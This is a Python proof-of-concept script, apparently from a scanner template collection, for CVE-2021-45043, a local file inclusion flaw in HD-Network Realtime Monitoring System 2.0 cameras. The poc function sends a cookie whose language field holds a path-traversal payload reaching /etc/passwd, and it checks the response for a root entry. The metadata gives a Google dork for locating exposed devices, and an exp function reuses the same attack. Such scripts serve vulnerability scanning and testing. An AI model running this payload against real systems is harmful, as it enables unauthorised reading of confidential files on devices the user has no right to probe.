import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''HD-Network Realtime Monitoring System 2.0 - Local File Inclusion''',
        "description": '''Instances of HD-Network Realtime Monitoring System version 2.0 are vulnerable to a Local File Inclusion vulnerability which allows remote unauthenticated attackers to view confidential information.''',
        "severity": "high",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-45043", 
            "https://www.exploit-db.com/exploits/50588", 
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45043", 
            "https://cyberguy0xd1.medium.com/my-cve-2021-45043-lfi-write-up-441dad30dd7f"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-45043",
            "cwe-id": "CWE-22"
        },
        "metadata":{
            "vuln-target": "",
            "google-dork":'''intitle:"HD-Network Real-time Monitoring System V2.0"'''
        },
        "tags": ["cve", "cve2021", "hdnetwork", "lfi", "iot", "camera"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/language/lang"""
        method = "GET"
        data = """"""
        headers = {'Cookie': 's_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype='}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url